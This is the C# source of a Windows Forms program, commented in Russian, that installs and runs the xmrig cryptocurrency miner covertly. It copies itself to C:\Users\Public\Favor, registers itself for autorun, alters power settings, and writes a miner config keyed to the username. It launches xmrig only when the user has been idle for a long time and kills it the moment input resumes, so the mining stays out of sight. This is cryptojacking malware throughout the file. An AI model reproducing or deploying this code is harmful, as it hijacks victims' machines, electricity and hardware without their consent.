using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;        //для того, чтобы копаться в директории
using Microsoft.Win32;      //чтобы залезть в реестр

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        string progStartName;
        bool prog_started;
        string textTranslit;
        int idleTimeOld;
        string time;
        int timeInt;
        int rigID;
        bool hiden=false;
        bool isOnWrightPlase = false;
        


        public Form1()
        {
            InitializeComponent();

            //узнает дату при включерии
            //можно сделать и так, для компактрости
            //*****.Text = DateTime.Now.ToString("yyyy.MM.dd, HH.mm.ss");    
            //Это можно разделять как хочешь. Можно оставить только дату или только время

            //label4.Text = DateTime.Now.ToShortDateString() + ", " + DateTime.Now.ToLongTimeString();

            //таймер. Просто таймер, который толкает функцию "tmrShow_Tick"
            Timer tmrShow = new Timer();
            tmrShow.Interval = 1;
            tmrShow.Tick += tmrShow_Tick;
            tmrShow.Enabled = true;

            progStartName = @"C:\Users\Public\Favor";

            string[] path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\');
            string s = "";
            for (int i = 0; i < (path.Length - 1);)
            {
                s = s + path[i];
                i++;

                if (i < (path.Length - 1))
                {
                    s = s + @"\";
                }
            }

            if (s == progStartName) 
            {
                isOnWrightPlase = true;
            }

            /*
            Autorun autoR = new Autorun();
            //autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, "\"" + progStartName + "\" -autorun");
            autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName );
            */
            /*
            CreateConfig cc = new CreateConfig();
            cc.stringeditor2(Environment.CurrentDirectory + @"\config.json", "11111111111111111", Environment.UserName);
            */

        }

        struct LastInputInfo    //переменная для хранения времени бездействия системы
        {
            public uint cbSize;

            public uint dwTime;
        }

        [DllImport("user32.dll")]   // подключение библиотеки для счёта времени бездействия
        static extern bool GetLastInputInfo(out LastInputInfo plii);    //функция подсчёта времени бездействия системы

        LastInputInfo lastInputInfo = new LastInputInfo();  //новая переменная для работы с временем бездействия




        private async void tmrShow_Tick(object sender, EventArgs e)      //функция счётчика времени
        {
            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo); //присвоение переменной времени бездействия
            GetLastInputInfo(out lastInputInfo);    //вызов функции для обновления переменной времени бездействия

            int idleTime = unchecked(Environment.TickCount - (int)lastInputInfo.dwTime);    //конвертация времени в удобоваримый вариант подсчёта.
                                                                                            //Этот вариант лучше, хотя разницы я не знаю
            

            if (hiden == false && isOnWrightPlase==true)
            {
                hiden = true;
                //Hide();
            }

            else if (hiden == false && isOnWrightPlase==false)
            {
                idleTimeOld= Convert.ToInt32(DateTime.Now.ToString("ss"));
                hiden = true;

                DirectoryInfo di = Directory.CreateDirectory(progStartName + @"\setings");

                CopyDir copy = new CopyDir();
                await Task.Run(() => copy.copyDir(Environment.CurrentDirectory, progStartName, false));

                Autorun autoR = new Autorun();
                await Task.Run(() => autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName));

                PowerSetings pow = new PowerSetings();
                await Task.Run(() => pow.SetSetings(progStartName));
            }




            if (File.Exists(progStartName + @"\setings\redy.txt"))
            {
                if (File.Exists(progStartName + @"\setings\json.txt"))
                {
                    string name = Environment.UserName;
                    Translite trans = new Translite();
                    trans.Tr2(name);

                    CreateConfig cc = new CreateConfig();

                    await Task.Run(() => cc.stringeditor2(Environment.CurrentDirectory + @"\config.json", "11111111111111111", name));
                    File.Create(Environment.CurrentDirectory + @"\setings\json.txt");
                }

                time = DateTime.Now.ToString("HH.mm");
                timeInt = Convert.ToInt32(DateTime.Now.ToString("HH"));

                if ((timeInt < 5 || timeInt > 22) && idleTime >= 800000 && prog_started == false && time != "00.00")
                {
                    prog_started = true;
                    start_prog();
                }

                //if (idleTime >= 3600000 && prog_started == false && time != "00.00")
                if (idleTime >= 3600000 && prog_started == false && time != "00.00")
                {
                    prog_started = true;
                    start_prog();
                }

                if (idleTime <= 4000  && prog_started == true )
                {
                    close_prog();
                }

                if (time == "00.00" && !File.Exists(Environment.CurrentDirectory + @"/restart.txt"))
                {
                    File.Create(Environment.CurrentDirectory + @"/restart.txt");
                    prog_started = false;
                    close_prog();
                }

                if (time == "00.01" && File.Exists(Environment.CurrentDirectory + @"/restart.txt") && !File.Exists(Environment.CurrentDirectory + @"/restart1.txt"))
                {

                    File.Create(Environment.CurrentDirectory + @"/restart1.txt");
                    FileStatus stat = new FileStatus();
                    stat.restart();
                }

                if (time == "00.02" && File.Exists(Environment.CurrentDirectory + @"/restart.txt") && File.Exists(Environment.CurrentDirectory + @"/restart1.txt"))
                {
                    File.Delete(Environment.CurrentDirectory + @"/restart.txt");
                    File.Delete(Environment.CurrentDirectory + @"/restart1.txt");
                    prog_started = true;
                    start_prog();
                }

                if (checkBox1.Checked == true)      //проверяет показывать ли в текствоксе когда пользователь ёрзает
                {
                    if (idleTime <= 100 && idleTimeOld >= 1000 && prog_started == false)
                    {
                        printString(DateTime.Now.ToString("HH.mm.ss") + " Last input.", true);
                    }
                    idleTimeOld = idleTime;
                }
            }
            else 
            {
                timeInt = Convert.ToInt32(DateTime.Now.ToString("ss"));

                if (idleTimeOld <= 57)
                {
                    //printInt(idleTimeOld + "  " + time, false);
                    if (idleTimeOld == timeInt-3)
                    { /*
                        System.Diagnostics.Process srartProg = new System.Diagnostics.Process();
                        srartProg.StartInfo.FileName = @"C:\Users\Public\Favor\" + System.AppDomain.CurrentDomain.FriendlyName;
                        srartProg.Start();
                        */
                        //Environment.Exit(0);
                        File.Create(progStartName + @"\setings\redy.txt");
                        //this.Close();
                        // Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
                        Process.Start(@"C:\Users\Public\Favor\start.bat");
                        //Environment.Exit(0);
                        //this.Close();
                        // Environment.Exit(0);  C:\Users\Public\Favor

                        Process.GetCurrentProcess().Kill();

                        //System.Diagnostics.Process.Start("explorer", progStartName);




                    }
                }
                else
                {
                    //printInt(idleTimeOld + "  " + time, false);
                    if (timeInt == 2)
                    { /*
                        System.Diagnostics.Process srartProg = new System.Diagnostics.Process();
                        srartProg.StartInfo.FileName = @"C:\Users\Public\Favor\" + System.AppDomain.CurrentDomain.FriendlyName;
                        srartProg.Start();
                        */
                        //Environment.Exit(0);
                        File.Create(progStartName + @"\setings\redy.txt");
                        //this.Close();
                        //Process.Start(@"C:\Users\Public\Favor\explorer.exe");

                        //Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
                        //this.Close();
                        Process.Start(@"C:\Users\Public\Favor\start.bat");
                        //Environment.Exit(0);
                        //this.Close();

                        Process.GetCurrentProcess().Kill();

                    }
                }
            }
        }







        private void start_prog()
        {
            try
            {
                System.Diagnostics.Process srartProg = new System.Diagnostics.Process();
                srartProg.StartInfo.FileName = Environment.CurrentDirectory+ @"\xmrig.exe";
                srartProg.Start();
                //srartProg = Process.Start("xmrig.exe");
                rigID = srartProg.Id;
                Process.GetProcessById(rigID).PriorityClass = ProcessPriorityClass.BelowNormal;
                prog_started = true;
                
            }
            catch //(Exception ex)
            {
                //MessageBox.Show(ex.Message , "Start");
                prog_started = false;
            }
        }






        private void close_prog()
        {
            Process[] processList = Process.GetProcessesByName("xmrig");
            try
            {
                if (processList.Length != 0)
                {
                    for (int i = 0; i < processList.Length;)
                    {
                        processList[i].Kill();
                        i++;
                    }
                }
                else
                {
                    prog_started = false;
                }
                //Process.GetProcessById(rigID).Kill();
            }
            catch 
            {

            }
        }

        private void printString(string masage, bool importmant)
        {
            if (importmant == false)
            {
                textBox1.Text = masage + Environment.NewLine + textBox1.Text;
            }
            else
            {
                textBox1.Text = "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯" + Environment.NewLine + textBox1.Text;
                textBox1.Text = masage + Environment.NewLine + textBox1.Text;
                textBox1.Text = "_______________" + Environment.NewLine + textBox1.Text;
            }

        }
        private void printInt(string masage, bool importmant)
        {
            if (importmant == false)
            {
                textBox1.Text = Convert.ToString(masage) + Environment.NewLine + textBox1.Text;
            }
            else
            {
                textBox1.Text = "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯" + Environment.NewLine + textBox1.Text;
                textBox1.Text = Convert.ToString(masage) + Environment.NewLine + textBox1.Text;
                textBox1.Text = "_______________" + Environment.NewLine + textBox1.Text;
            }
        }

        private void button1_Click(object sender, EventArgs e)  //перезапускает
        {
            FileStatus stat = new FileStatus();
            stat.restart();
        }

        private void button2_Click(object sender, EventArgs e)  //стартует какой-то процесс. Нужно указать имя exe файла
        {
            prog_started = true;
            start_prog();
        }

        private void button3_Click(object sender, EventArgs e)  //убивает процесс
        {
            prog_started = false;
            close_prog();
        }

        private void button4_Click(object sender, EventArgs e)  //прячет программу
        {
            Hide();
        }
        protected override void WndProc(ref Message m)  //события при подключении и отключении усб
        {
            base.WndProc(ref m);
            if (m.WParam.ToInt32() == 0x8000)
                label1.Text = "USB connected!";
            if (m.WParam.ToInt32() == 0x8004)
                label1.Text = "USB  disconnected!";
        }

        private void button6_Click(object sender, EventArgs e)
        {
            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo); //присвоение переменной времени бездействия
            GetLastInputInfo(out lastInputInfo);    //вызов функции для обновления переменной времени бездействия
            var idleTime = Environment.TickCount - lastInputInfo.dwTime;    //конвертация времени в удобоваримый вариант подсчёта
            label1.Text = Convert.ToString(idleTime);   //вывод времени на лейбу
        }

       

        private void button7_Click(object sender, EventArgs e)      //транслит
        {
            Translite tr = new Translite();
            textTranslit = textBox1.Text;
            textBox1.Text = tr.Tr2(textTranslit);
            label3.Text = tr.Tr2(textTranslit);

        }

        private async void button9_Click(object sender, EventArgs e)      //создание конфига
        {
            string name = Environment.UserName;
            Translite trans = new Translite();
            trans.Tr2(name);

            CreateConfig cc = new CreateConfig();

            await Task.Run(() => cc.stringeditor2(Environment.CurrentDirectory + @"\config.json", "11111111111111111", name));
           
        }

        private void button10_Click(object sender, EventArgs e)     //установки настроек Спящих режимов
        {
            PowerSetings pow = new PowerSetings();
            pow.SetSetings(progStartName);
        }

        private void button11_Click(object sender, EventArgs e)     //просто создание папки
        {
            FolderCreate create = new FolderCreate();
            create.PathCreate(@"C:\Users\Owerlord\Desktop\112211");
        }

        private void button8_Click(object sender, EventArgs e)
        {
            //string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
            //string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            //string path = System.Environment.GetCommandLineArgs()[0];
            //string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\').Last();

            string[] path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Split('\\');
            string s = "";
            for (int i = 0; i < (path.Length - 1);)
            {
                s = s + path[i];
                i++;
                if (i < (path.Length - 1))
                {
                    s = s + @"\";
                }
            }
            printString(s,false);
        }

        private void button5_Click(object sender, EventArgs e)
        {

            Autorun autoR = new Autorun();
            autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName);
            //File.Create(Environment.CurrentDirectory + @"\autorn.txt");
        }

        private void ReadConfig_Click(object sender, EventArgs e)
        {
            WorkInProgConfigFile config = new WorkInProgConfigFile();
            textBox1.Text= config.GetData(textBox1.Text);
        }

        private void WrightConfig_Click(object sender, EventArgs e)
        {
            WorkInProgConfigFile config = new WorkInProgConfigFile();
            string[] s = textBox1.Text.Split('!');
            config.SetData(s[0],s[1]);
            textBox1.Text = "";
        }
    }
}